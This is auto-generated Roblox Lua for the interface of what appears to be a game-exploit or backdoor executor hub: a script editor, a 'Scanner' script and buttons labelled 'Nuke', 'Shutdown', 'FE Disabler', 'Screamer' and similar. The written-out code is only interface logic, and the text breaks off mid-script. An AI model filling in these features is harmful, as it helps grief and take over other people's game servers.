G2L["4a"] = Instance.new("TextButton", G2L["37"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextScaled"] = true;
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["BackgroundTransparency"] = 1;
G2L["4a"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[HappyHub]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["4b"] = Instance.new("UIStroke", G2L["4a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["4c"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["4d"] = Instance.new("LocalScript", G2L["4a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["4e"] = Instance.new("TextButton", G2L["37"]);
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextScaled"] = true;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["BackgroundTransparency"] = 1;
G2L["4e"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Text"] = [[RC7]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["4f"] = Instance.new("UIStroke", G2L["4e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["50"] = Instance.new("UIStroke", G2L["4e"]);
G2L["50"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["51"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["52"] = Instance.new("TextButton", G2L["37"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextScaled"] = true;
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["BackgroundTransparency"] = 1;
G2L["52"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Text"] = [[KJ]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["53"] = Instance.new("UIStroke", G2L["52"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["54"] = Instance.new("UIStroke", G2L["52"]);
G2L["54"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["52"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["56"] = Instance.new("TextButton", G2L["37"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextSize"] = 14;
G2L["56"]["TextScaled"] = true;
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["BackgroundTransparency"] = 1;
G2L["56"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[Nuke]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["57"] = Instance.new("UIStroke", G2L["56"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["56"]);
G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["59"] = Instance.new("LocalScript", G2L["56"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["5a"] = Instance.new("TextButton", G2L["37"]);
G2L["5a"]["TextWrapped"] = true;
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["TextSize"] = 14;
G2L["5a"]["TextScaled"] = true;
G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5a"]["BackgroundTransparency"] = 1;
G2L["5a"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["Text"] = [[c00lkidd music]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["5b"] = Instance.new("UIStroke", G2L["5a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["5c"] = Instance.new("UIStroke", G2L["5a"]);
G2L["5c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["5e"] = Instance.new("TextButton", G2L["37"]);
G2L["5e"]["TextWrapped"] = true;
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["TextSize"] = 14;
G2L["5e"]["TextScaled"] = true;
G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["BackgroundTransparency"] = 1;
G2L["5e"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Text"] = [[Inf Yield]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["5f"] = Instance.new("UIStroke", G2L["5e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["60"] = Instance.new("UIStroke", G2L["5e"]);
G2L["60"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["61"] = Instance.new("LocalScript", G2L["5e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["62"] = Instance.new("TextButton", G2L["37"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextScaled"] = true;
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["BackgroundTransparency"] = 1;
G2L["62"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[Silent SS]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["63"] = Instance.new("UIStroke", G2L["62"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["64"] = Instance.new("UIStroke", G2L["62"]);
G2L["64"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["65"] = Instance.new("LocalScript", G2L["62"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["66"] = Instance.new("TextButton", G2L["37"]);
G2L["66"]["TextWrapped"] = true;
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["TextSize"] = 14;
G2L["66"]["TextScaled"] = true;
G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["66"]["BackgroundTransparency"] = 1;
G2L["66"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Text"] = [[l0stAdmin]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["67"] = Instance.new("UIStroke", G2L["66"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["68"] = Instance.new("UIStroke", G2L["66"]);
G2L["68"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["69"] = Instance.new("LocalScript", G2L["66"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["6a"] = Instance.new("TextButton", G2L["37"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["BackgroundTransparency"] = 1;
G2L["6a"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Text"] = [[AntiSkid]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["6b"] = Instance.new("UIStroke", G2L["6a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6a"]);
G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["6d"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["6e"] = Instance.new("TextButton", G2L["37"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["TextSize"] = 14;
G2L["6e"]["TextScaled"] = true;
G2L["6e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6e"]["BackgroundTransparency"] = 1;
G2L["6e"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Text"] = [[Destroy All Sounds]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["6f"] = Instance.new("UIStroke", G2L["6e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["70"] = Instance.new("UIStroke", G2L["6e"]);
G2L["70"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["6e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["72"] = Instance.new("TextButton", G2L["37"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextSize"] = 14;
G2L["72"]["TextScaled"] = true;
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["BackgroundTransparency"] = 1;
G2L["72"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[Shutdown]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["73"] = Instance.new("UIStroke", G2L["72"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["74"] = Instance.new("UIStroke", G2L["72"]);
G2L["74"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["75"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["76"] = Instance.new("TextButton", G2L["37"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextScaled"] = true;
G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Text"] = [[FE Disabler]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["77"] = Instance.new("UIStroke", G2L["76"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["78"] = Instance.new("UIStroke", G2L["76"]);
G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["79"] = Instance.new("LocalScript", G2L["76"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["7a"] = Instance.new("TextButton", G2L["37"]);
G2L["7a"]["TextWrapped"] = true;
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextScaled"] = true;
G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["BackgroundTransparency"] = 1;
G2L["7a"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Text"] = [[Gojo]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["7b"] = Instance.new("UIStroke", G2L["7a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["7c"] = Instance.new("UIStroke", G2L["7a"]);
G2L["7c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["7e"] = Instance.new("TextButton", G2L["37"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["TextScaled"] = true;
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["BackgroundTransparency"] = 1;
G2L["7e"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[Guns]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["7f"] = Instance.new("UIStroke", G2L["7e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["80"] = Instance.new("UIStroke", G2L["7e"]);
G2L["80"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["82"] = Instance.new("TextButton", G2L["37"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextScaled"] = true;
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["BackgroundTransparency"] = 1;
G2L["82"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Text"] = [[Screamer]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["83"] = Instance.new("UIStroke", G2L["82"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["84"] = Instance.new("UIStroke", G2L["82"]);
G2L["84"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["86"] = Instance.new("TextButton", G2L["37"]);
G2L["86"]["TextWrapped"] = true;
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["TextSize"] = 14;
G2L["86"]["TextScaled"] = true;
G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["BackgroundTransparency"] = 1;
G2L["86"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Text"] = [[Sensation]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["87"] = Instance.new("UIStroke", G2L["86"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["88"] = Instance.new("UIStroke", G2L["86"]);
G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.ScreenGui.Frame.ImageButton
G2L["8a"] = Instance.new("ImageButton", G2L["2"]);
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["Image"] = [[rbxassetid://11347112400]];
G2L["8a"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Position"] = UDim2.new(0, 0, 0.12162, 0);


-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
G2L["8b"] = Instance.new("UIStroke", G2L["8a"]);



-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
G2L["8c"] = Instance.new("LocalScript", G2L["8a"]);



-- StarterGui.ScreenGui.Frame.ImageButton
G2L["8d"] = Instance.new("ImageButton", G2L["2"]);
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["Image"] = [[rbxassetid://11570895459]];
G2L["8d"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Position"] = UDim2.new(0, 0, 0.26689, 0);


-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
G2L["8e"] = Instance.new("UIStroke", G2L["8d"]);



-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
G2L["8f"] = Instance.new("LocalScript", G2L["8d"]);



-- StarterGui.ScreenGui.Frame.ImageButton
G2L["90"] = Instance.new("ImageButton", G2L["2"]);
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["Image"] = [[rbxassetid://1365082776]];
G2L["90"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Position"] = UDim2.new(0, 0, 0.41216, 0);


-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
G2L["91"] = Instance.new("UIStroke", G2L["90"]);



-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
G2L["92"] = Instance.new("LocalScript", G2L["90"]);



-- StarterGui.ScreenGui.Frame.page4
G2L["93"] = Instance.new("Frame", G2L["2"]);
G2L["93"]["Visible"] = false;
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
G2L["93"]["Size"] = UDim2.new(0, 361, 0, 260);
G2L["93"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Name"] = [[page4]];
G2L["93"]["BackgroundTransparency"] = 0.5;


-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame
G2L["94"] = Instance.new("ScrollingFrame", G2L["93"]);
G2L["94"]["Active"] = true;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["94"]["Size"] = UDim2.new(0, 361, 0, 260);
G2L["94"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["ScrollBarThickness"] = 3;
G2L["94"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
G2L["95"] = Instance.new("LocalScript", G2L["94"]);



-- StarterGui.ScreenGui.Frame.ImageButton
G2L["96"] = Instance.new("ImageButton", G2L["2"]);
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["BackgroundTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["Image"] = [[rbxassetid://101630023371308]];
G2L["96"]["Size"] = UDim2.new(0, 43, 0, 43);
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Position"] = UDim2.new(0, 0, 0.55743, 0);


-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
G2L["97"] = Instance.new("UIStroke", G2L["96"]);



-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
G2L["98"] = Instance.new("LocalScript", G2L["96"]);



-- StarterGui.ScreenGui.Scanner
G2L["99"] = Instance.new("LocalScript", G2L["1"]);
G2L["99"]["Name"] = [[Scanner]];


-- StarterGui.ScreenGui.Frame.Dragify
local function C_6()
local script = G2L["6"];
	local frame = script.Parent
	local UIS = game:GetService("UserInputService")
	
	local dragging = false
	local dragStart = nil
	local startPos = nil
	
	-- When mouse or touch begins
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
		end
	end)
	
	-- When mouse or touch ends
	frame.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
	
	-- Update position while dragging
	UIS.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end;
task.spawn(C_6);
-- StarterGui.ScreenGui.Frame.page1.ImageLabel.LocalScript
local function C_b()
local script = G2L["b"];
	-- Place this LocalScript inside the ImageLabel
	local Players = game:GetService("Players")
	local imageLabel = script.Parent
	local player = Players.LocalPlayer
	
	-- Wait until the player is fully loaded
	if not player.Character then
		player.CharacterAdded:Wait()
	end
	
	-- Get the player's thumbnail
	local function updateThumbnail()
		local userId = player.UserId
		local thumbnailType = Enum.ThumbnailType.HeadShot
		local thumbnailSize = Enum.ThumbnailSize.Size420x420
		
		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbnailType, thumbnailSize)
		if isReady then
			imageLabel.Image = content
		end
	end
	
	updateThumbnail()
end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Frame.page1.TextLabel.LocalScript
local function C_f()
local script = G2L["f"];
	script.Parent.Text = 'Welcome, ' .. game.Players.LocalPlayer.Name .. '!'
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
local function C_1a()
local script = G2L["1a"];
	local scrollingFrame = script.Parent
	local lastY = scrollingFrame.CanvasSize.Y.Offset
	
	game:GetService("RunService").RenderStepped:Connect(function()
		local currentY = scrollingFrame.CanvasSize.Y.Offset
		
		if currentY > lastY then
			-- Expansion detected, scroll to bottom once
			scrollingFrame.CanvasPosition = Vector2.new(0, currentY)
			lastY = currentY
		end
	end)
end;
task.spawn(C_1a);
-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
local function C_20()
local script = G2L["20"];
	local textBox = script.Parent
	local parent = textBox.Parent
	local textLabel = parent:FindFirstChild("TextLabel")
	
	local function updateLineNumbers()
		if not textLabel then return end
		
		local lines = string.split(textBox.Text, "\n")
		local numberedLines = {}
		
		for i = 1, #lines do
			table.insert(numberedLines, tostring(i))
		end
		
		textLabel.Text = table.concat(numberedLines, "\n")
	end
	
	textBox:GetPropertyChangedSignal("Text"):Connect(updateLineNumbers)
	
	updateLineNumbers()
end;
task.spawn(C_20);
-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
local function C_21()
local script = G2L["21"];
	local textBox = script.Parent
	local player = game:GetService("Players").LocalPlayer
	local runService = game:GetService("RunService")
	
	local screenGui = textBox:FindFirstAncestorOfClass("ScreenGui")
	local memorizedKeywords = {}
	
	-- Tooltip container
	local tooltipFrame = Instance.new("ScrollingFrame")
	tooltipFrame.Name = "TooltipFrame"
	tooltipFrame.Size = UDim2.new(0, 200, 0, 100)
